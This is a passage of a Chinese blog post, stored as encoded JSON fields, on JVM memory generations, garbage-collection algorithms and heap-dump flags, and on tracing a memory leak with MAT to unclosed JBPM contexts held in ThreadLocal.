&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;Serial&#x6536;&#x96C6;</p>\n</li>\n<li><p>&#x7EBF;&#x7A0B;&#x5806;&#x6808;&#x7684;&#x8BBE;&#x7F6E;&#xFF1A;&#x6BCF;&#x4E2A;&#x7EBF;&#x7A0B;&#x9ED8;&#x8BA4;&#x4F1A;&#x5F00;&#x542F;1M&#x7684;&#x5806;&#x6808;&#xFF0C;&#x7528;&#x4E8E;&#x5B58;&#x653E;&#x6808;&#x5E27;&#x3001;&#x8C03;&#x7528;&#x53C2;&#x6570;&#x3001;&#x5C40;&#x90E8;&#x53D8;&#x91CF;&#x7B49;&#xFF0C;&#x5BF9;&#x5927;&#x591A;&#x6570;&#x5E94;&#x7528;&#x800C;&#x8A00;&#x8FD9;&#x4E2A;&#x9ED8;&#x8BA4;&#x503C;&#x592A;&#x4E86;&#xFF0C;&#x4E00;&#x822C;256K&#x5C31;&#x8DB3;&#x7528;&#x3002;&#x7406;&#x8BBA;&#x4E0A;&#xFF0C;&#x5728;&#x5185;&#x5B58;&#x4E0D;&#x53D8;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x51CF;&#x5C11;&#x6BCF;&#x4E2A;&#x7EBF;&#x7A0B;&#x7684;&#x5806;&#x6808;&#xFF0C;&#x53EF;&#x4EE5;&#x4EA7;&#x751F;&#x66F4;&#x591A;&#x7684;&#x7EBF;&#x7A0B;&#xFF0C;&#x4F46;&#x8FD9;&#x5B9E;&#x9645;&#x4E0A;&#x8FD8;&#x53D7;&#x9650;&#x4E8E;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x3002;</p>\n</li>\n<li><p>&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E0B;&#x9762;&#x7684;&#x53C2;&#x6570;&#x6253;Heap Dump&#x4FE1;&#x606F;<br>&#xFF08;1&#xFF09;-XX:HeapDumpPath<br>&#xFF08;2&#xFF09;-XX:+PrintGCDetails<br>&#xFF08;3&#xFF09;-XX:+PrintGCTimeStamps<br>&#xFF08;4&#xFF09;-Xloggc:/usr/aaa/dump/heap_trace.txt</p>\n</li>\n</ul>\n<p>&#x901A;&#x8FC7;&#x4E0B;&#x9762;&#x53C2;&#x6570;&#x53EF;&#x4EE5;&#x63A7;&#x5236;OutOfMemoryError&#x65F6;&#x6253;&#x5370;&#x5806;&#x7684;&#x4FE1;&#x606F;<br>-XX:+HeapDumpOnOutOfMemoryError</p>\n<p>&#x8BF7;&#x770B;&#x4E00;&#x4E0B;&#x4E00;&#x4E2A;&#x65F6;&#x95F4;&#x7684;Java&#x53C2;&#x6570;&#x914D;&#x7F6E;&#xFF1A;&#xFF08;&#x670D;&#x52A1;&#x5668;&#xFF1A;Linux 64Bit&#xFF0C;8Core&#xD7;16G&#xFF09;<br> JAVA_OPTS=&#x201D;$JAVA_OPTS -server -Xms3G -Xmx3G -Xss256k -XX:PermSize=128m -XX:MaxPermSize=128m -XX:+UseParallelOldGC -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/usr/aaa/dump -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -Xloggc:/usr/aaa/dump/heap_trace.txt -XX:NewSize=1G -XX:MaxNewSize=1G&#x201D;</p>\n<p>&#x7ECF;&#x8FC7;&#x89C2;&#x5BDF;&#x8BE5;&#x914D;&#x7F6E;&#x975E;&#x5E38;&#x7A33;&#x5B9A;&#xFF0C;&#x6BCF;&#x6B21;&#x666E;&#x901A;GC&#x7684;&#x65F6;&#x95F4;&#x5728;10ms&#x5DE6;&#x53F3;&#xFF0C;Full GC&#x57FA;&#x672C;&#x4E0D;&#x53D1;&#x751F;&#xFF0C;&#x6216;&#x9694;&#x5F88;&#x957F;&#x5F88;&#x957F;&#x7684;&#x65F6;&#x95F4;&#x624D;&#x53D1;&#x751F;&#x4E00;&#x6B21;</p>\n<p>&#x901A;&#x8FC7;&#x5206;&#x6790;dump&#x6587;&#x4EF6;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;&#x6BCF;&#x4E2A;1&#x5C0F;&#x65F6;&#x90FD;&#x4F1A;&#x53D1;&#x751F;&#x4E00;&#x6B21;Full GC&#xFF0C;&#x7ECF;&#x8FC7;&#x591A;&#x65B9;&#x6C42;&#x8BC1;&#xFF0C;&#x53EA;&#x8981;&#x5728;JVM&#x4E2D;&#x5F00;&#x542F;&#x4E86;JMX&#x670D;&#x52A1;&#xFF0C;JMX&#x5C06;&#x4F1A;1&#x5C0F;&#x65F6;&#x6267;&#x884C;&#x4E00;&#x6B21;Full GC&#x4EE5;&#x6E05;&#x9664;&#x5F15;&#x7528;&#xFF0C;&#x5173;&#x4E8E;&#x8FD9;&#x70B9;&#x8BF7;&#x53C2;&#x8003;&#x9644;&#x4EF6;&#x6587;&#x6863;&#x3002;</p>\n<h4 id=\"4-&#x7A0B;&#x5E8F;&#x7B97;&#x6CD5;&#x8C03;&#x4F18;&#xFF1A;&#x672C;&#x6B21;&#x4E0D;&#x4F5C;&#x4E3A;&#x91CD;&#x70B9;\"><a href=\"#4-&#x7A0B;&#x5E8F;&#x7B97;&#x6CD5;&#x8C03;&#x4F18;&#xFF1A;&#x672C;&#x6B21;&#x4E0D;&#x4F5C;&#x4E3A;&#x91CD;&#x70B9;\" class=\"headerlink\" title=\"4.&#x7A0B;&#x5E8F;&#x7B97;&#x6CD5;&#x8C03;&#x4F18;&#xFF1A;&#x672C;&#x6B21;&#x4E0D;&#x4F5C;&#x4E3A;&#x91CD;&#x70B9;\"></a>4.&#x7A0B;&#x5E8F;&#x7B97;&#x6CD5;&#x8C03;&#x4F18;&#xFF1A;&#x672C;&#x6B21;&#x4E0D;&#x4F5C;&#x4E3A;&#x91CD;&#x70B9;</h4>","excerpt":"<p>&#x6700;&#x8FD1;&#x56E0;&#x9879;&#x76EE;&#x5B58;&#x5728;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#xFF0C;&#x6545;&#x8FDB;&#x884C;&#x5927;&#x89C4;&#x6A21;&#x7684;JVM&#x6027;&#x80FD;&#x8C03;&#x4F18;&#xFF0C;&#x73B0;&#x628A;&#x76F8;&#x5173;&#x77E5;&#x8BC6;&#x8FDB;&#x884C;&#x5F52;&#x7EB3;&#x603B;&#x7ED3;</p>\n<h3 id=\"&#x4E00;&#x3001;JVM&#x5185;&#x5B58;&#x6A21;&#x578B;&#x53CA;&#x5783;&#x573E;&#x6536;&#x96C6;&#x7B97;&#x6CD5;\"><a href=\"#&#x4E00;&#x3001;JVM&#x5185;&#x5B58;&#x6A21;&#x578B;&#x53CA;&#x5783;&#x573E;&#x6536;&#x96C6;&#x7B97;&#x6CD5;\" class=\"headerlink\" title=\"&#x4E00;&#x3001;JVM&#x5185;&#x5B58;&#x6A21;&#x578B;&#x53CA;&#x5783;&#x573E;&#x6536;&#x96C6;&#x7B97;&#x6CD5;\"></a>&#x4E00;&#x3001;JVM&#x5185;&#x5B58;&#x6A21;&#x578B;&#x53CA;&#x5783;&#x573E;&#x6536;&#x96C6;&#x7B97;&#x6CD5;</h3><h4 id=\"1-&#x5185;&#x5B58;&#x6A21;&#x578B;\"><a href=\"#1-&#x5185;&#x5B58;&#x6A21;&#x578B;\" class=\"headerlink\" title=\"1.&#x5185;&#x5B58;&#x6A21;&#x578B;\"></a>1.&#x5185;&#x5B58;&#x6A21;&#x578B;</h4><p>&#x6839;&#x636E;Java&#x865A;&#x62DF;&#x673A;&#x89C4;&#x8303;&#xFF0C;JVM&#x5C06;&#x5185;&#x5B58;&#x5212;&#x5206;&#x4E3A;&#xFF1A;</p>\n<ul>\n<li>&#x5E74;&#x8F7B;&#x4EE3;&#xFF08;New&#xFF09;&#xFF1A;&#x5E74;&#x8F7B;&#x4EE3;&#x7528;&#x6765;&#x5B58;&#x653E;JVM&#x521A;&#x5206;&#x914D;&#x7684;Java&#x5BF9;&#x8C61;</li>\n<li>&#x5E74;&#x8001;&#x4EE3;&#xFF08;Tenured)&#xFF1A;&#x5E74;&#x8F7B;&#x4EE3;&#x4E2D;&#x7ECF;&#x8FC7;&#x5783;&#x573E;&#x56DE;&#x6536;&#x6CA1;&#x6709;&#x56DE;&#x6536;&#x6389;&#x7684;&#x5BF9;&#x8C61;&#x5C06;&#x88AB;Copy&#x5230;&#x5E74;&#x8001;&#x4EE3;</li>\n<li>&#x6C38;&#x4E45;&#x4EE3;&#xFF08;Perm&#xFF09;&#xFF1A;&#x6C38;&#x4E45;&#x4EE3;&#x5B58;&#x653E;Class&#x3001;Method&#x5143;&#x4FE1;&#x606F;&#xFF0C;&#x5176;&#x5927;&#x5C0F;&#x8DDF;&#x9879;&#x76EE;&#x7684;&#x89C4;&#x6A21;&#x3001;&#x7C7B;&#x3001;&#x65B9;&#x6CD5;&#x7684;&#x91CF;&#x6709;&#x5173;&#xFF0C;&#x4E00;&#x822C;&#x8BBE;&#x7F6E;&#x4E3A;128M&#x5C31;&#x8DB3;&#x591F;&#xFF0C;&#x8BBE;&#x7F6E;&#x539F;&#x5219;&#x662F;&#x9884;&#x7559;30%&#x7684;&#x7A7A;&#x95F4;&#x3002;</li>\n</ul>\n<p>&#x5176;&#x4E2D;New&#x548C;Tenured&#x5C5E;&#x4E8E;&#x5806;&#x5185;&#x5B58;&#xFF0C;&#x5806;&#x5185;&#x5B58;&#x4F1A;&#x4ECE;JVM&#x542F;&#x52A8;&#x53C2;&#x6570;&#xFF08;-Xmx:3G&#xFF09;&#x6307;&#x5B9A;&#x7684;&#x5185;&#x5B58;&#x4E2D;&#x5206;&#x914D;&#x3002;<br>Perm&#x4E0D;&#x5C5E;&#x4E8E;&#x5806;&#x5185;&#x5B58;&#xFF0C;&#x6709;&#x865A;&#x62DF;&#x673A;&#x76F4;&#x63A5;&#x5206;&#x914D;&#xFF0C;&#x4F46;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;-XX:PermSize -XX:MaxPermSize &#x7B49;&#x53C2;&#x6570;&#x8C03;&#x6574;&#x5176;&#x5927;&#x5C0F;&#x3002;</p>\n<p>New&#x53C8;&#x5206;&#x4E3A;&#x51E0;&#x4E2A;&#x90E8;&#x5206;&#xFF1A;</p>\n<ul>\n<li>Eden&#xFF1A;Eden&#x7528;&#x6765;&#x5B58;&#x653E;JVM&#x521A;&#x5206;&#x914D;&#x7684;&#x5BF9;&#x8C61;</li>\n<li>Survivor1</li>\n<li>Survivro2&#xFF1A;&#x4E24;&#x4E2A;Survivor&#x7A7A;&#x95F4;&#x4E00;&#x6837;&#x5927;&#xFF0C;&#x5F53;Eden&#x4E2D;&#x7684;&#x5BF9;&#x8C61;&#x7ECF;&#x8FC7;&#x5783;&#x573E;&#x56DE;&#x6536;&#x6CA1;&#x6709;&#x88AB;&#x56DE;&#x6536;&#x6389;&#x65F6;&#xFF0C;&#x4F1A;&#x5728;&#x4E24;&#x4E2A;Survivor&#x4E4B;&#x95F4;&#x6765;&#x56DE;Copy&#xFF0C;&#x5F53;&#x6EE1;&#x8DB3;&#x67D0;&#x4E2A;&#x6761;&#x4EF6;&#xFF0C;&#x6BD4;&#x5982;Copy&#x6B21;&#x6570;&#xFF0C;&#x5C31;&#x4F1A;&#x88AB;Copy&#x5230;Tenured&#x3002;&#x663E;&#x7136;&#xFF0C;Survivor&#x53EA;&#x662F;&#x589E;&#x52A0;&#x4E86;&#x5BF9;&#x8C61;&#x5728;&#x5E74;&#x8F7B;&#x4EE3;&#x4E2D;&#x7684;&#x9017;&#x7559;&#x65F6;&#x95F4;&#xFF0C;&#x589E;&#x52A0;&#x4E86;&#x88AB;&#x5783;&#x573E;&#x56DE;&#x6536;&#x7684;&#x53EF;&#x80FD;&#x6027;&#x3002;</li>\n</ul>\n<h4 id=\"2-&#x5783;&#x573E;&#x56DE;&#x6536;&#x7B97;&#x6CD5;\"><a href=\"#2-&#x5783;&#x573E;&#x56DE;&#x6536;&#x7B97;&#x6CD5;\" class=\"headerlink\" title=\"2.&#x5783;&#x573E;&#x56DE;&#x6536;&#x7B97;&#x6CD5;\"></a>2.&#x5783;&#x573E;&#x56DE;&#x6536;&#x7B97;&#x6CD5;</h4><p>&#x5783;&#x573E;&#x56DE;&#x6536;&#x7B97;&#x6CD5;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x4E09;&#x7C7B;&#xFF0C;&#x90FD;&#x57FA;&#x4E8E;&#x6807;&#x8BB0;-&#x6E05;&#x9664;&#xFF08;&#x590D;&#x5236;&#xFF09;&#x7B97;&#x6CD5;&#xFF1A;</p>\n<ul>\n<li>Serial&#x7B97;&#x6CD5;&#xFF08;&#x5355;&#x7EBF;&#x7A0B;&#xFF09;</li>\n<li>&#x5E76;&#x884C;&#x7B97;&#x6CD5;</li>\n<li>&#x5E76;&#x53D1;&#x7B97;&#x6CD5;</li>\n</ul>\n<p>JVM&#x4F1A;&#x6839;&#x636E;&#x673A;&#x5668;&#x7684;&#x786C;&#x4EF6;&#x914D;&#x7F6E;&#x5BF9;&#x6BCF;&#x4E2A;&#x5185;&#x5B58;&#x4EE3;&#x9009;&#x62E9;&#x9002;&#x5408;&#x7684;&#x56DE;&#x6536;&#x7B97;&#x6CD5;&#xFF0C;&#x6BD4;&#x5982;&#xFF0C;&#x5982;&#x679C;&#x673A;&#x5668;&#x591A;&#x4E8E;1&#x4E2A;&#x6838;&#xFF0C;&#x4F1A;&#x5BF9;&#x5E74;&#x8F7B;&#x4EE3;&#x9009;&#x62E9;&#x5E76;&#x884C;&#x7B97;&#x6CD5;&#xFF0C;&#x5173;&#x4E8E;&#x9009;&#x62E9;&#x7EC6;&#x8282;&#x8BF7;&#x53C2;&#x8003;JVM&#x8C03;&#x4F18;&#x6587;&#x6863;&#x3002;</p>\n<p>&#x7A0D;&#x5FAE;&#x89E3;&#x91CA;&#x4E0B;&#x7684;&#x662F;&#xFF0C;&#x5E76;&#x884C;&#x7B97;&#x6CD5;&#x662F;&#x7528;&#x591A;&#x7EBF;&#x7A0B;&#x8FDB;&#x884C;&#x5783;&#x573E;&#x56DE;&#x6536;&#xFF0C;&#x56DE;&#x6536;&#x671F;&#x95F4;&#x4F1A;&#x6682;&#x505C;&#x7A0B;&#x5E8F;&#x7684;&#x6267;&#x884C;&#xFF0C;&#x800C;&#x5E76;&#x53D1;&#x7B97;&#x6CD5;&#xFF0C;&#x4E5F;&#x662F;&#x591A;&#x7EBF;&#x7A0B;&#x56DE;&#x6536;&#xFF0C;&#x4F46;&#x671F;&#x95F4;&#x4E0D;&#x505C;&#x6B62;&#x5E94;&#x7528;&#x6267;&#x884C;&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x5E76;&#x53D1;&#x7B97;&#x6CD5;&#x9002;&#x7528;&#x4E8E;&#x4EA4;&#x4E92;&#x6027;&#x9AD8;&#x7684;&#x4E00;&#x4E9B;&#x7A0B;&#x5E8F;&#x3002;&#x7ECF;&#x8FC7;&#x89C2;&#x5BDF;&#xFF0C;&#x5E76;&#x53D1;&#x7B97;&#x6CD5;&#x4F1A;&#x51CF;&#x5C11;&#x5E74;&#x8F7B;&#x4EE3;&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x4F7F;&#x7528;&#x4E86;&#x4E00;&#x4E2A;&#x5927;&#x7684;&#x5E74;&#x8001;&#x4EE3;&#xFF0C;&#x8FD9;&#x53CD;&#x8FC7;&#x6765;&#x8DDF;&#x5E76;&#x884C;&#x7B97;&#x6CD5;&#x76F8;&#x6BD4;&#x541E;&#x5410;&#x91CF;&#x76F8;&#x5BF9;&#x8F83;&#x4F4E;&#x3002;</p>\n<p><strong>&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x662F;&#xFF0C;&#x5783;&#x573E;&#x56DE;&#x6536;&#x52A8;&#x4F5C;&#x4F55;&#x65F6;&#x6267;&#x884C;&#xFF1F;Full GC&#x5F71;&#x54CD;&#x8F83;&#x5927;&#xFF0C;&#x5E94;&#x5C3D;&#x53EF;&#x80FD;&#x4E0D;&#x8FDB;&#x884C;Full GC</strong></p>\n<ul>\n<li>&#x5F53;&#x5E74;&#x8F7B;&#x4EE3;&#x5185;&#x5B58;&#x6EE1;&#x65F6;&#xFF0C;&#x4F1A;&#x5F15;&#x53D1;&#x4E00;&#x6B21;&#x666E;&#x901A;GC&#xFF0C;&#x8BE5;GC&#x4EC5;&#x56DE;&#x6536;&#x5E74;&#x8F7B;&#x4EE3;&#x3002;&#x9700;&#x8981;&#x5F3A;&#x8C03;&#x7684;&#x65F6;&#xFF0C;&#x5E74;&#x8F7B;&#x4EE3;&#x6EE1;&#x662F;&#x6307;Eden&#x4EE3;&#x6EE1;&#xFF0C;Survivor&#x6EE1;&#x4E0D;&#x4F1A;&#x5F15;&#x53D1;GC</li>\n<li>&#x5F53;&#x5E74;&#x8001;&#x4EE3;&#x6EE1;&#x65F6;&#x4F1A;&#x5F15;&#x53D1;Full GC&#xFF0C;Full GC&#x5C06;&#x4F1A;&#x540C;&#x65F6;&#x56DE;&#x6536;&#x5E74;&#x8F7B;&#x4EE3;&#x3001;&#x5E74;&#x8001;&#x4EE3;</li>\n<li>&#x5F53;&#x6C38;&#x4E45;&#x4EE3;&#x6EE1;&#x65F6;&#x4E5F;&#x4F1A;&#x5F15;&#x53D1;Full GC&#xFF0C;&#x4F1A;&#x5BFC;&#x81F4;Class&#x3001;Method&#x5143;&#x4FE1;&#x606F;&#x7684;&#x5378;&#x8F7D;</li>\n</ul>\n<p><strong>&#x53E6;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x662F;&#xFF0C;&#x4F55;&#x65F6;&#x4F1A;&#x629B;&#x51FA;OutOfMemoryException&#xFF0C;&#x5E76;&#x4E0D;&#x662F;&#x5185;&#x5B58;&#x88AB;&#x8017;&#x7A7A;&#x7684;&#x65F6;&#x5019;&#x624D;&#x629B;&#x51FA;</strong></p>\n<ul>\n<li>JVM98%&#x7684;&#x65F6;&#x95F4;&#x90FD;&#x82B1;&#x8D39;&#x5728;&#x5185;&#x5B58;&#x56DE;&#x6536;</li>\n<li>&#x6BCF;&#x6B21;&#x56DE;&#x6536;&#x7684;&#x5185;&#x5B58;&#x5C0F;&#x4E8E;2%</li>\n</ul>\n<p>&#x6EE1;&#x8DB3;&#x8FD9;&#x4E24;&#x4E2A;&#x6761;&#x4EF6;&#x5C06;&#x89E6;&#x53D1;OutOfMemoryException&#xFF0C;&#x8FD9;&#x5C06;&#x4F1A;&#x7559;&#x7ED9;&#x7CFB;&#x7EDF;&#x4E00;&#x4E2A;&#x5FAE;&#x5C0F;&#x7684;&#x95F4;&#x9699;&#x4EE5;&#x505A;&#x4E00;&#x4E9B;Down&#x4E4B;&#x524D;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x6BD4;&#x5982;&#x624B;&#x52A8;&#x6253;&#x5370;Heap Dump&#x3002;</p>","more":"<p><br></p>\n<h3 id=\"&#x4E8C;&#x3001;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#x53CA;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;\"><a href=\"#&#x4E8C;&#x3001;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#x53CA;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;\" class=\"headerlink\" title=\"&#x4E8C;&#x3001;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#x53CA;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;\"></a>&#x4E8C;&#x3001;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#x53CA;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;</h3><h4 id=\"1-&#x7CFB;&#x7EDF;&#x5D29;&#x6E83;&#x524D;&#x7684;&#x4E00;&#x4E9B;&#x73B0;&#x8C61;&#xFF1A;\"><a href=\"#1-&#x7CFB;&#x7EDF;&#x5D29;&#x6E83;&#x524D;&#x7684;&#x4E00;&#x4E9B;&#x73B0;&#x8C61;&#xFF1A;\" class=\"headerlink\" title=\"1.&#x7CFB;&#x7EDF;&#x5D29;&#x6E83;&#x524D;&#x7684;&#x4E00;&#x4E9B;&#x73B0;&#x8C61;&#xFF1A;\"></a>1.&#x7CFB;&#x7EDF;&#x5D29;&#x6E83;&#x524D;&#x7684;&#x4E00;&#x4E9B;&#x73B0;&#x8C61;&#xFF1A;</h4><ul>\n<li>&#x6BCF;&#x6B21;&#x5783;&#x573E;&#x56DE;&#x6536;&#x7684;&#x65F6;&#x95F4;&#x8D8A;&#x6765;&#x8D8A;&#x957F;&#xFF0C;&#x7531;&#x4E4B;&#x524D;&#x7684;10ms&#x5EF6;&#x957F;&#x5230;50ms&#x5DE6;&#x53F3;&#xFF0C;FullGC&#x7684;&#x65F6;&#x95F4;&#x4E5F;&#x6709;&#x4E4B;&#x524D;&#x7684;0.5s&#x5EF6;&#x957F;&#x5230;4&#x3001;5s</li>\n<li>FullGC&#x7684;&#x6B21;&#x6570;&#x8D8A;&#x6765;&#x8D8A;&#x591A;&#xFF0C;&#x6700;&#x9891;&#x7E41;&#x65F6;&#x9694;&#x4E0D;&#x5230;1&#x5206;&#x949F;&#x5C31;&#x8FDB;&#x884C;&#x4E00;&#x6B21;FullGC</li>\n<li>&#x5E74;&#x8001;&#x4EE3;&#x7684;&#x5185;&#x5B58;&#x8D8A;&#x6765;&#x8D8A;&#x5927;&#x5E76;&#x4E14;&#x6BCF;&#x6B21;FullGC&#x540E;&#x5E74;&#x8001;&#x4EE3;&#x6CA1;&#x6709;&#x5185;&#x5B58;&#x88AB;&#x91CA;&#x653E;&#x4E4B;&#x540E;&#x7CFB;&#x7EDF;&#x4F1A;&#x65E0;&#x6CD5;&#x54CD;&#x5E94;&#x65B0;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x9010;&#x6E10;&#x5230;&#x8FBE;OutOfMemoryError&#x7684;&#x4E34;&#x754C;&#x503C;&#x3002;</li>\n</ul>\n<h4 id=\"2-&#x751F;&#x6210;&#x5806;&#x7684;dump&#x6587;&#x4EF6;\"><a href=\"#2-&#x751F;&#x6210;&#x5806;&#x7684;dump&#x6587;&#x4EF6;\" class=\"headerlink\" title=\"2.&#x751F;&#x6210;&#x5806;&#x7684;dump&#x6587;&#x4EF6;\"></a>2.&#x751F;&#x6210;&#x5806;&#x7684;dump&#x6587;&#x4EF6;</h4><p> &#x901A;&#x8FC7;JMX&#x7684;MBean&#x751F;&#x6210;&#x5F53;&#x524D;&#x7684;Heap&#x4FE1;&#x606F;&#xFF0C;&#x5927;&#x5C0F;&#x4E3A;&#x4E00;&#x4E2A;3G&#xFF08;&#x6574;&#x4E2A;&#x5806;&#x7684;&#x5927;&#x5C0F;&#xFF09;&#x7684;hprof&#x6587;&#x4EF6;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x542F;&#x52A8;JMX&#x53EF;&#x4EE5;&#x901A;&#x8FC7;Java&#x7684;jmap&#x547D;&#x4EE4;&#x6765;&#x751F;&#x6210;&#x8BE5;&#x6587;&#x4EF6;&#x3002;</p>\n<h4 id=\"3-&#x5206;&#x6790;dump&#x6587;&#x4EF6;\"><a href=\"#3-&#x5206;&#x6790;dump&#x6587;&#x4EF6;\" class=\"headerlink\" title=\"3.&#x5206;&#x6790;dump&#x6587;&#x4EF6;\"></a>3.&#x5206;&#x6790;dump&#x6587;&#x4EF6;</h4><p>&#x4E0B;&#x9762;&#x8981;&#x8003;&#x8651;&#x7684;&#x662F;&#x5982;&#x4F55;&#x6253;&#x5F00;&#x8FD9;&#x4E2A;3G&#x7684;&#x5806;&#x4FE1;&#x606F;&#x6587;&#x4EF6;&#xFF0C;&#x663E;&#x7136;&#x4E00;&#x822C;&#x7684;Window&#x7CFB;&#x7EDF;&#x6CA1;&#x6709;&#x8FD9;&#x4E48;&#x5927;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x5FC5;&#x987B;&#x501F;&#x52A9;&#x9AD8;&#x914D;&#x7F6E;&#x7684;Linux&#x3002;&#x5F53;&#x7136;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x501F;&#x52A9;X-Window&#x628A;Linux&#x4E0A;&#x7684;&#x56FE;&#x5F62;&#x5BFC;&#x5165;&#x5230;Window&#x3002;&#x6211;&#x4EEC;&#x8003;&#x8651;&#x7528;&#x4E0B;&#x9762;&#x51E0;&#x79CD;&#x5DE5;&#x5177;&#x6253;&#x5F00;&#x8BE5;&#x6587;&#x4EF6;&#xFF1A;</p>\n<ul>\n<li>Visual VM</li>\n<li>IBM HeapAnalyzer</li>\n<li>JDK &#x81EA;&#x5E26;&#x7684;Hprof&#x5DE5;&#x5177;</li>\n</ul>\n<p>&#x4F7F;&#x7528;&#x8FD9;&#x4E9B;&#x5DE5;&#x5177;&#x65F6;&#x4E3A;&#x4E86;&#x786E;&#x4FDD;&#x52A0;&#x8F7D;&#x901F;&#x5EA6;&#xFF0C;&#x5EFA;&#x8BAE;&#x8BBE;&#x7F6E;&#x6700;&#x5927;&#x5185;&#x5B58;&#x4E3A;6G&#x3002;&#x4F7F;&#x7528;&#x540E;&#x53D1;&#x73B0;&#xFF0C;&#x8FD9;&#x4E9B;&#x5DE5;&#x5177;&#x90FD;&#x65E0;&#x6CD5;&#x76F4;&#x89C2;&#x5730;&#x89C2;&#x5BDF;&#x5230;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#xFF0C;Visual VM&#x867D;&#x80FD;&#x89C2;&#x5BDF;&#x5230;&#x5BF9;&#x8C61;&#x5927;&#x5C0F;&#xFF0C;&#x4F46;&#x770B;&#x4E0D;&#x5230;&#x8C03;&#x7528;&#x5806;&#x6808;&#xFF1B;HeapAnalyzer&#x867D;&#x7136;&#x80FD;&#x770B;&#x5230;&#x8C03;&#x7528;&#x5806;&#x6808;&#xFF0C;&#x5374;&#x65E0;&#x6CD5;&#x6B63;&#x786E;&#x6253;&#x5F00;&#x4E00;&#x4E2A;3G&#x7684;&#x6587;&#x4EF6;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x6211;&#x4EEC;&#x53C8;&#x9009;&#x7528;&#x4E86;Eclipse&#x4E13;&#x95E8;&#x7684;&#x9759;&#x6001;&#x5185;&#x5B58;&#x5206;&#x6790;&#x5DE5;&#x5177;Mat</p>\n<h4 id=\"4-&#x5206;&#x6790;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;\"><a href=\"#4-&#x5206;&#x6790;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;\" class=\"headerlink\" title=\"4.&#x5206;&#x6790;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;\"></a>4.&#x5206;&#x6790;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;</h4><p>&#x901A;&#x8FC7;Mat&#x6211;&#x4EEC;&#x80FD;&#x6E05;&#x695A;&#x5730;&#x770B;&#x5230;&#xFF0C;&#x54EA;&#x4E9B;&#x5BF9;&#x8C61;&#x88AB;&#x6000;&#x7591;&#x4E3A;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#xFF0C;&#x54EA;&#x4E9B;&#x5BF9;&#x8C61;&#x5360;&#x7684;&#x7A7A;&#x95F4;&#x6700;&#x5927;&#x53CA;&#x5BF9;&#x8C61;&#x7684;&#x8C03;&#x7528;&#x5173;&#x7CFB;&#x3002;&#x9488;&#x5BF9;&#x672C;&#x6848;&#xFF0C;&#x5728;ThreadLocal&#x4E2D;&#x6709;&#x5F88;&#x591A;&#x7684;JbpmContext&#x5B9E;&#x4F8B;&#xFF0C;&#x7ECF;&#x8FC7;&#x8C03;&#x67E5;&#x662F;JBPM&#x7684;Context&#x6CA1;&#x6709;&#x5173;&#x95ED;&#x6240;&#x81F4;</p>\n<p>&#x53E6;&#x5916;&#xFF0C;&#x901A;&#x8FC7;Mat&#x6216;JMX&#x6211;&#x4EEC;&#x8FD8;&#x53EF;&#x4EE5;&#x5206;&#x6790;&#x7EBF;&#x7A0B;&#x72B6;&#x6001;&#xFF0C;&#x53EF;&#x4EE5;&#x89C2;&#x5BDF;&#x5230;&#x7EBF;&#x7A0B;&#x88AB;&#x963B;&#x585E;&#x5728;&#x54EA;&#x4E2A;&#x5BF9;&#x8C61;&#x4E0A;&#xFF0C;&#x4ECE;&#x800C;&#x5224;&#x65AD;&#x7CFB;&#x7EDF;&#x7684;&#x74F6;&#x9888;&#x3002;</p>\n<h4 id=\"5-&#x56DE;&#x5F52;&#x95EE;&#x9898;\"><a href=\"#5-&#x56DE;&#x5F52;&#x95EE;&#x9898;\" class=\"headerlink\" title=\"5.&#x56DE;&#x5F52;&#x95EE;&#x9898;\"></a>5.&#x56DE;&#x5F52;&#x95EE;&#x9898;</h4><p><strong> Q&#xFF1A;&#x4E3A;&#x4EC0;&#x4E48;&#x5D29;&#x6E83;&#x524D;&#x5783;&#x573E;&#x56DE;&#x6536;&#x7684;&#x65F6;&#x95F4;&#x8D8A;&#x6765;&#x8D8A;&#x957F;&#xFF1F;</strong><br>A:&#x6839;&#x636E;&#x5185;&#x5B58;&#x6A21;&#x578B;&#x548C;&#x5783;&#x573E;&#x56DE;&#x6536;&#x7B97;&#x6CD5;&#xFF0C;&#x5783;&#x573E;&#x56DE;&#x6536;&#x5206;&#x4E24;&#x90E8;&#x5206;&#xFF1A;&#x5185;&#x5B58;&#x6807;&#x8BB0;&#x3001;&#x6E05;&#x9664;&#xFF08;&#x590D;&#x5236;&#xFF09;&#xFF0C;&#x6807;&#x8BB0;&#x90E8;&#x5206;&#x53EA;&#x8981;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#x56FA;&#x5B9A;&#x65F6;&#x95F4;&#x662F;&#x4E0D;&#x53D8;&#x7684;&#xFF0C;&#x53D8;&#x7684;&